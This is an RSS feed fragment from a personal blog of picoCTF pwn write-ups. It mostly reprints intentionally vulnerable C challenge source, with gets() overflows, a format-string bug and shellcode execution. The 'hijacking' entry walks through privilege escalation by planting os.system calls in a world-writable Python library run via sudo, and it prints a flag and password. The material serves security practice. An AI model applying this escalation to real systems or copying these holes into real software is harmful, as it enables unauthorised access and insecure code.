&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	gid_t gid &lt;span style="color:#f92672">=&lt;/span> getegid();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setresgid(gid, gid, gid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Welcome to my guessing game!&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		res &lt;span style="color:#f92672">=&lt;/span> do_stuff();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (res) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			win();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</guid><description>&lt;h1 id="picoctf---guessing-game-2">
 PicoCTF - Guessing Game 2
 &lt;a class="anchor" href="#picoctf---guessing-game-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>fmt / leak libc / ret2libc / leak canary&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

// void print(long n)
// {
// // If number is smaller than 0, put a - sign
// // and change number to positive
// if (n &amp;lt; 0) {
// putchar(&amp;#39;-&amp;#39;);
// n = -n;
// }
 
// // Remove the last digit and recur
// if (n/10)
// print(n/10);
 
// // Print the last digit
// putchar(n%10 + &amp;#39;0&amp;#39;);
// }

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	// print(ans);
	int res = 0;
	
	printf(&amp;#34;What number would you like to guess?\n&amp;#34;);
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf(&amp;#34;That&amp;#39;s not a valid number!\n&amp;#34;);
	} else {
		if (g == ans) {
			printf(&amp;#34;Congrats! You win! Your prize is this print statement!\n\n&amp;#34;);
			res = 1;
		} else {
			printf(&amp;#34;Nope!\n\n&amp;#34;);
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf(&amp;#34;New winner!\nName? &amp;#34;);
	gets(winner);
	printf(&amp;#34;Congrats: &amp;#34;);
	printf(winner);
	printf(&amp;#34;\n\n&amp;#34;);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf(&amp;#34;Welcome to my guessing game!\n&amp;#34;);
	printf(&amp;#34;Version: %x\n\n&amp;#34;, get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</guid><description>&lt;h1 id="picoctf---hijacking">
 PicoCTF - hijacking
 &lt;a class="anchor" href="#picoctf---hijacking">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Privilege Escalation&lt;/p>
&lt;p>Hint 1: Check for Hidden files
Hint 2: No place like Home:)&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.runoob.com/linux/linux-comm-sudo.html">Linux sudo命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-l 顯示出自己（執行 sudo 的使用者）的權限&lt;/p>&lt;/blockquote>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library&lt;/li>
&lt;li>現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell&lt;/li>
&lt;li>為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ls -al /usr/lib/python3.8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwxrwxrwx &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">20382&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">38995&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> os.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">35243&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> socket.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh picoctf@saturn.picoctf.net -p &lt;span style="color:#ae81ff">58219&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ find / -name &lt;span style="color:#e6db74">&amp;#34;base64.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># add these line and save the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>import os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ls -al /challenge&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Matching Defaults entries &lt;span style="color:#66d9ef">for&lt;/span> picoctf on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> env_reset, mail_badpass,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> secure_path&lt;span style="color:#f92672">=&lt;/span>/usr/local/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/local/bin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/bin&lt;span style="color:#ae81ff">\:&lt;/span>/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/bin&lt;span style="color:#ae81ff">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User picoctf may run the following commands on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>ALL&lt;span style="color:#f92672">)&lt;/span> /usr/bin/vi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d--------- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">6&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">51&lt;/span> Jul &lt;span style="color:#ae81ff">31&lt;/span> 15:23 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">103&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 metadata.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># revise the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;cat /challegne/metadata.json&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoctf&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;HYGhWsmPyf&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</guid><description>&lt;h1 id="picoctf---kit-engine">
 PicoCTF - Kit Engine
 &lt;a class="anchor" href="#picoctf---kit-engine">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10216397">Google V8 Engine&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://v8.dev/docs/d8">Using d8&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>d8 is V8’s own developer shell.&lt;/p>
&lt;p>d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &amp;ndash;help argument for more information about usage and flags.&lt;/p></description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</guid><description>&lt;h1 id="picoctf---ropfu">
 PicoCTF - ropfu
 &lt;a class="anchor" href="#picoctf---ropfu">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
x86 Calling Convention:
&lt;a href="https://chromium.googlesource.com/chromiumos/docs/&amp;#43;/master/constants/syscalls.md#x86-32_bit">Linux System Call Table&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 16

void vuln() {
 char buf[16];
 printf(&amp;#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&amp;#34;);
 return gets(buf);

}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</guid><description>&lt;h1 id="picoctf---rps">
 PicoCTF - RPS
 &lt;a class="anchor" href="#picoctf---rps">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/strstr-in-ccpp/">strstr() in C/C++&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there.
Syntax:&lt;/p></description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</guid><description>&lt;h1 id="picoctf---saas">
 PicoCTF - SaaS
 &lt;a class="anchor" href="#picoctf---saas">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>seccomp-tool&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;error.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#define SIZE 0x100

// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;amp;arch=x86-64&amp;amp;as_format=inline#assembly
#define HEADER &amp;#34;\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&amp;#34;

#define FLAG_SIZE 64

char flag[FLAG_SIZE];

void load_flag() {
 int fd;
 if ((fd = open(&amp;#34;flag.txt&amp;#34;, O_RDONLY)) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;open flag&amp;#34;);
 if (read(fd, flag, FLAG_SIZE) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;read flag&amp;#34;);
 if (close(fd) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;close flag&amp;#34;);
}

void setup() {
 scmp_filter_ctx ctx;
 ctx = seccomp_init(SCMP_ACT_KILL);
 int ret = 0;
 if (ctx != NULL) {
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
 SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 ret |= seccomp_load(ctx);
 }
 seccomp_release(ctx);
 if (ctx == NULL || ret)
 error(EXIT_FAILURE, 0, &amp;#34;seccomp&amp;#34;);
}

int main()
{
 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 load_flag();
 puts(&amp;#34;Welcome to Shellcode as a Service!&amp;#34;);

 void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 memcpy(addr, HEADER, sizeof(HEADER));
 read(0, addr + sizeof(HEADER) - 1, SIZE);

 setup();
 goto *addr;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</guid><description>&lt;h1 id="picoctf---seed-spring">
 PicoCTF - seed-sPRiNG
 &lt;a class="anchor" href="#picoctf---seed-spring">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int guess_height; // [esp+0h] [ebp-18h] BYREF
 int ans; // [esp+4h] [ebp-14h]
 unsigned int seed; // [esp+8h] [ebp-10h]
 int i; // [esp+Ch] [ebp-Ch]
 int *p_argc; // [esp+10h] [ebp-8h]

 p_argc = &amp;amp;argc;
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;#34; # mmmmm mmmmm \&amp;#34; mm m mmm &amp;#34;);
 puts(&amp;#34; mmm mmm mmm mmm# mmm # \&amp;#34;# # \&amp;#34;# mmm #\&amp;#34;m # m\&amp;#34; \&amp;#34;&amp;#34;);
 puts(&amp;#34; # \&amp;#34; #\&amp;#34; # #\&amp;#34; # #\&amp;#34; \&amp;#34;# # \&amp;#34; #mmm#\&amp;#34; #mmmm\&amp;#34; # # #m # # mm&amp;#34;);
 puts(&amp;#34; \&amp;#34;\&amp;#34;\&amp;#34;m #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; # # \&amp;#34;\&amp;#34;\&amp;#34;m # # \&amp;#34;m # # # # # #&amp;#34;);
 puts(&amp;#34; \&amp;#34;mmm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#m## \&amp;#34;mmm\&amp;#34; # # \&amp;#34; mm#mm # ## \&amp;#34;mmm\&amp;#34;&amp;#34;);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34;Welcome! The game is easy: you jump on a sPRiNG.&amp;#34;);
 puts(&amp;#34;How high will you fly?&amp;#34;);
 puts(&amp;amp;unk_A50);
 fflush(stdout);
 seed = time(0);
 srand(seed);
 for ( i = 1; i &amp;lt;= 30; ++i )
 {
 printf(&amp;#34;LEVEL (%d/30)\n&amp;#34;, i);
 puts(&amp;amp;unk_A50);
 LOBYTE(ans) = rand() &amp;amp; 0xF;
 ans = ans;
 printf(&amp;#34;Guess the height: &amp;#34;);
 fflush(stdout);
 __isoc99_scanf(&amp;#34;%d&amp;#34;, &amp;amp;guess_height);
 fflush(stdin);
 if ( ans != guess_height )
 {
 puts(&amp;#34;WRONG! Sorry, better luck next time!&amp;#34;);
 fflush(stdout);
 exit(-1);
 }
 }
 puts(&amp;#34;Congratulation! You&amp;#39;ve won! Here is your flag:\n&amp;#34;);
 fflush(stdout);
 get_flag();
 fflush(stdout);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</guid><description>&lt;h1 id="picoctf---stack-cache">
 PicoCTF - stack cache
 &lt;a class="anchor" href="#picoctf---stack-cache">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
 char buf[FLAGSIZE];
 char filler[BUFSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
 // this function is under construction
 char consideration[BUFSIZE];
 char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = &amp;#34;Enter names&amp;#34;;
	// *q = &amp;#34;Name 1&amp;#34;;
	// *r = &amp;#34;Name 2&amp;#34;;
 unsigned long *age;
	printf(&amp;#34;User information : %p %p %p %p %p %p\n&amp;#34;,demographic, location, identification, session, votes, dependents);
	printf(&amp;#34;Names of user: %p %p %p\n&amp;#34;, p,q,r);
 printf(&amp;#34;Age of user: %p\n&amp;#34;,age);
 fflush(stdout);
}

void vuln(){
 char buf[INPSIZE];
 printf(&amp;#34;Give me a string that gets you the flag\n&amp;#34;);
 gets(buf);
 printf(&amp;#34;%s\n&amp;#34;,buf);
 return;
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 printf(&amp;#34;Bye!&amp;#34;);
 return 0;
}
